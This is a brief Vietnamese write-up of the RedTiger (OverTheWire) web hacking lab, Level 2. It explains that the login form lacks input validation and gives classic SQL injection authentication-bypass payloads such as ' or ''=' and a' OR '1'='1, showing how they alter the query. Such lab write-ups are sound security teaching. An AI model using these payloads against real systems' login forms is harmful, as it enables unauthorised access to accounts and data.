 	BÁO CÁO LEVEL 2

Cách khai thác:
	+Nhìn vào trong source của

[Level_2](http://redtiger.labs.overthewire.org/level2.php)

Ta thấy phần khai báo username và password:
![text](http://i.imgur.com/lgBLqBB.png)

- Lỗ hổng ở đây chính là do lập trình viên không thực hiện bưóc kiểm tra thông tin vào. Do đó bằng cách đăng nhập với username và password theo ý ta có thể vượt qua được và đăng nhập mà không cần biết username và password.

+Ta đăng nhập:
```sh
username: ' or ''='
password:  ' or ''=' 

or

username: a' OR '1'='1
password:  a' OR '1'='1
```
Thì đoạn source sẽ bị thay đổi như sau

```sh
name=''or''=''
pasword=''or''=''

or

name='a' OR '1'='1'
password='a' OR '1'='1'
```
Nhờ toán tử OR ta có thể đăng nhập vào đưọc
